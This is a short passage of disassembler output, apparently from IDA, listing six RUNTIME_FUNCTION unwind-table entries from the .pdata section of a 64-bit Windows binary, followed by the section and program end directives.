RUNTIME_FUNCTION <rva _guard_xfg_dispatch_icall_nop,\
                  rva algn_140007216, \
                  rva stru_14000A748>
RUNTIME_FUNCTION <rva sub_140007220, \
                  rva sub_140007251, \
                  rva stru_14000A114>
RUNTIME_FUNCTION <rva sub_14000726F, \
                  rva sub_140007295, \
                  rva stru_14000A114>
RUNTIME_FUNCTION <rva loc_140007358, \
                  rva algn_140007393, \
                  rva stru_14000A49C>
RUNTIME_FUNCTION <rva loc_1400073A0, \
                  rva algn_1400073BE, \
                  rva stru_14000A114>
RUNTIME_FUNCTION <rva loc_1400073C0, \
                  rva algn_1400073D8, \
                  rva stru_14000A6FC>
align 1000h
_pdata ends


end start
